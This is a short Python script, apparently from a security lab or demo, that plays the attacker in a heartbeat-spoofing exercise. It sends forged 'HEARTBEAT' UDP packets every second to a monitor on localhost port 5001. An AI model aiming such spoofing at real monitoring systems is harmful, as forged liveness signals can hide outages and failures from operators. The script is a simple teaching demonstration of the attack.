import socket
import time

MONITOR_IP = '127.0.0.1'
MONITOR_PORT = 5001
ATTACK_INTERVAL = 1.0

def start_spoofing():
    print(f"[ATTACKER] Initiating Heartbeat Spoofing attack on {MONITOR_IP}:{MONITOR_PORT}...")
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:

            fake_message = f"HEARTBEAT:{time.time()}".encode()
            udp_sock.sendto(fake_message, (MONITOR_IP, MONITOR_PORT))
            print("[ATTACKER] Spoofed heartbeat sent.")
            time.sleep(ATTACK_INTERVAL)
        except KeyboardInterrupt:
            print("\n[ATTACKER] Attack stopped.")
            break
        except Exception as e:
            print(f"[ATTACKER] Error: {e}")
            break

if __name__ == "__main__":
    start_spoofing()
